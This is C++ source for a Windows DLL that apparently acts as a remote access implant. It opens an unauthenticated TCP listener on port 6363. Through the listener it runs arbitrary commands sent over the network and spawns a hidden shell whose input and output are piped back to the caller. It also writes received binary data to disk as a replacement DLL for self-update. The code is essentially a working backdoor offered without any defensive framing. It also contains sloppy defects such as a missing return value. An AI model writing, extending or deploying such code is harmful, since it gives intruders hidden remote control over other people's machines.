#include <array>
#include "tcp_listener.h"
#include "Main.h"

#define MAX_BUFFER_LENGTH 200000
#define MIN_BUFFER_LENGTH 1024

char g_sOutBuffer[MAX_BUFFER_LENGTH] = { 0 };
HANDLE g_hChildStd_OUT_Rd;
HANDLE g_hChildStd_IN_Wr;
PROCESS_INFORMATION g_processInfo;

BOOL WINAPI DllMain(
	HINSTANCE hinstDLL,		// handle to DLL module
	DWORD fdwReason,		// reason for calling function
	LPVOID lpReserved)		// reserved
{
	// Perform actions based on the reason for calling.
	switch (fdwReason)
	{

	case DLL_PROCESS_ATTACH:
		printf("Initialize once for each new process...\n");
		// Initialize once for each new process.
		// Return FALSE to fail DLL load.
		break;

	case DLL_THREAD_ATTACH:
		printf("Do thread-specific initialization...\n");
		// Do thread-specific initialization.
		break;

	case DLL_THREAD_DETACH:
		printf("Do thread-specific cleanup...\n");

		// Do thread-specific cleanup.
		break;


	case DLL_PROCESS_DETACH:
		printf("Perform any necessary cleanup...\n");

		if (g_processInfo.hProcess) 
		{
			TerminateProcess(g_processInfo.hProcess, 0);
			CloseHandle(g_processInfo.hProcess);
		}

		// Perform any necessary cleanup.
		break;
	}

	// Successful DLL_PROCESS_ATTACH.
	return TRUE;
}

/**
After a command and execute the proper function in response
Returns the result of the proper requested function.

@param buffer: The command requested
@return Tthe result of the proper requested function.
*/
int OnAccept(char* buffer)
{
	char cType = buffer[0];
	int nLength = *(int*)(buffer + 1);
	char* sValue = buffer + 5;

	switch (cType)
	{
	case 'u':
		return Update(nLength, sValue);
	case 'c':
		return ExecuteCommand(nLength, sValue);
	case 'o':
		return OpenShell(nLength, sValue);
	case 's':
		return ExecuteOnShell(nLength, sValue);
	default:
		return Echo(sValue);
		break;
	}
}

/**
Starting a new tcp connection and setting a socket om port 6363
*/
void StartConnection()
{
	const int port = 6363;

	//fList.emplace(std::make_pair("echo", Echo));

	tcp_listener listener(OnAccept, g_sOutBuffer);
	printf("Starting socket on port %d...\n", port);
	listener.start(port);

	return;
}


/**
@param buffer: An output buffer that will return the full path of the executable
Returns the full path of the executable.
*/
void GetExecutablePath(char* buffer)
{	
	GetModuleFileName(NULL, buffer, MAX_PATH);
	std::string::size_type pos = std::string(buffer).find_last_of("\\/");
	//std::string(buffer).substr(0, pos + 1);

	buffer[pos + 1] = '\0';
}

/**
Prints out the data received in the buffer

@param buffer: The data to echo out
@return -1
*/
const int Echo(char* buffer)
{
	//std::cout << buffer << std::endl;
	strcpy_s(g_sOutBuffer, MAX_BUFFER_LENGTH -1, buffer);

	return -2;
}

/**
Execute Command on the user machine

@param length: The length of the command to execute 
@param command: The data to echo out
@return -1
*/
const int ExecuteCommand(int length, char* command)
{
	std::array<char, 128> buffer;
	std::string result;
	std::shared_ptr<FILE> pipe(_popen(command, "r"), _pclose);
	if (pipe)
	{
		while (!feof(pipe.get())) {
			if (fgets(buffer.data(), 128, pipe.get()) != nullptr)
				result += buffer.data();
		}

		strcpy_s(g_sOutBuffer, MAX_BUFFER_LENGTH -1, result.c_str());

		return -2;
	}
}

/**
Open shell on the user machine

@param length: The length of the shell name
@param shellType: The data to echo out
@return -1
*/
const int OpenShell(int length, char* shellType)
{
	// if shell is open - no need to do anything
	if (g_processInfo.hProcess)
	{
		return -1;
	}

	// init security attributes
	SECURITY_ATTRIBUTES saAttr;
	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	saAttr.bInheritHandle = TRUE;
	saAttr.lpSecurityDescriptor = NULL;

	HANDLE hChildStd_OUT_Wr;
	HANDLE hChildStd_IN_Rd;

	// create pipes for stdin and stdout of the shell
	if (!CreatePipe(
		&g_hChildStd_OUT_Rd,
		&hChildStd_OUT_Wr,
		&saAttr,
		0
	))
	{
		printf("Could not create OUT pipe\n");
		return -1;
	};

	if (!CreatePipe(
		&hChildStd_IN_Rd,
		&g_hChildStd_IN_Wr,
		&saAttr,
		0
	))
	{
		printf("Could not create IN pipe\n");
		return -1;
	}

	STARTUPINFO info = { sizeof(info) };
	info.wShowWindow = SW_HIDE;
	info.hStdInput = hChildStd_IN_Rd;
	info.hStdError = hChildStd_OUT_Wr;
	info.hStdOutput = hChildStd_OUT_Wr;
	info.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;

	// open shell in a new process
	if (!CreateProcess(
		NULL,
		shellType,
		NULL,
		NULL,
		TRUE,
		0,
		NULL,
		NULL,
		&info,
		&g_processInfo
	))
	{
		strcpy_s(g_sOutBuffer, MAX_BUFFER_LENGTH - 1, "Failed to open shell");
		return -2;
	}

	return -1;
}

std::string ReadFromPipe(HANDLE pipe) {
	CHAR chBuf[MAX_BUFFER_LENGTH];
	DWORD dwRead;
	DWORD avail;
	bool bSuccess = FALSE;
	bool tSuccess = FALSE;
	std::string out = "";
	tSuccess = PeekNamedPipe(pipe, NULL, 0, NULL, &avail, NULL);
	if (tSuccess && avail >= MAX_BUFFER_LENGTH) {
		while (avail >= MAX_BUFFER_LENGTH) {
			bSuccess = ReadFile(pipe, chBuf, MAX_BUFFER_LENGTH, &dwRead, NULL);
			if (!bSuccess || dwRead == 0) break;
			std::string s(chBuf, dwRead);
			out += s;
			avail = avail - MAX_BUFFER_LENGTH;
		}
		return out;
	}
	else {
		return "[false]";
	}
}

/**
Interact with open shell in the client

@param length: The length of the command
@param command: The command to run in the shell
@return -1
*/
const int ExecuteOnShell(int length, char* command)
{
	if (!g_processInfo.hThread)
	{
		strcpy_s(g_sOutBuffer, MAX_BUFFER_LENGTH - 1, "There is no open shell to run in.");
		return -2;
	}

	DWORD dwWritten, dwRead, nBufferNeeded;

	//command[length] = '\n';

	if (!WriteFile(
		g_hChildStd_IN_Wr,
		command,
		length,
		&dwWritten,
		NULL
	))
	{
		DWORD error = GetLastError();
		strcpy_s(g_sOutBuffer, MAX_BUFFER_LENGTH - 1, "Could not interact with shell.");
		return -2;
	}

	if (!WriteFile(
		g_hChildStd_IN_Wr,
		"\r\n",
		2,
		&dwWritten,
		NULL
	))
	{
		DWORD error = GetLastError();
		strcpy_s(g_sOutBuffer, MAX_BUFFER_LENGTH - 1, "Could not interact with shell.");
		return -2;
	}

	Sleep(1000);

	size_t pos = 0;
	BOOL bPeekSuccess;

	PeekNamedPipe(g_hChildStd_OUT_Rd, NULL, 0, NULL, &nBufferNeeded, NULL);
	char* chBuffer = new char[nBufferNeeded + 1];
	ReadFile(
		g_hChildStd_OUT_Rd,
		chBuffer,
		nBufferNeeded,
		&dwRead,
		NULL
	);

	strcpy_s(g_sOutBuffer, MAX_BUFFER_LENGTH, chBuffer);
	g_sOutBuffer[nBufferNeeded] = 0;

	return -2;
}

/**
After receiving an update command - digest a binary data and create a DLL file
Returns 0 if operation failed along the way.

@param length: The length of the data
@param value: The data to convert into DLL
@return 0 for a failure.
*/
const int Update(int length, char* value)
{
	char exePath[MAX_PATH];

	GetExecutablePath(exePath);
	std::string filePath(exePath);
	filePath.append("TcpServer.dll.new");

	// Saving binary data as TcpServer.dll.new
	auto hFile = CreateFile(
		filePath.c_str(),				// lpFileName,
		GENERIC_READ | GENERIC_WRITE,	// dwDesiredAccess,
		0,								// dwShareMode,
		NULL,							// lpSecurityAttributes,
		CREATE_ALWAYS,					// dwCreationDisposition,
		FILE_ATTRIBUTE_NORMAL,			// dwFlagsAndAttributes,
		NULL							// hTemplateFile
	);

	// if file could not be created
	if (!hFile) { return -1; }

	if (WriteFile(
		hFile,							// file handler
		value,							// data
		length,					// nNumberOfBytesToWrite 
		NULL,							// lpNumberOfBytesWritten 
		NULL							// lpOverlapped 
	)) 
	{
		// write succeded

		auto e = GetLastError();

		CloseHandle(hFile);
		return 0;
	}
	else 
	{
		// writing failed
		CloseHandle(hFile);
		return -1;
	}

}